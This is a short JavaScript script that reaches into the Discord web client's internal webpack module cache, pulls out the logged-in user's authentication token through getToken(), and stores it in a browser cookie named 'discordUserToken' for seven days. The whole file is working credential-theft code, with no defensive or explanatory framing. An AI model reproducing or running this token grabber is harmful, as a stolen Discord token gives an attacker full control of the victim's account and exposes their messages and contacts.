function setCookie(name, value, days) {
    const expires = new Date();
    expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}

function waitForWebpack(callback) {
    const checkWebpack = () => {
        if (Array.isArray(window.webpackChunkdiscord_app)) {
            clearInterval(interval);
            callback();
        }
    };
    const interval = setInterval(checkWebpack, 100);
}

waitForWebpack(() => {
    try {
        var TOKEN = (window.webpackChunkdiscord_app.push([
            [''], {},
            e => {
                m = [];
                for (let c in e.c) m.push(e.c[c]);
            }
        ]), m)
        .find(m => m?.exports?.default?.getToken !== void 0)
        .exports.default.getToken();

        setCookie("discordUserToken", TOKEN, 7);
    } catch (error) {
        console.error("Error extracting Discord token:", error);
    }
});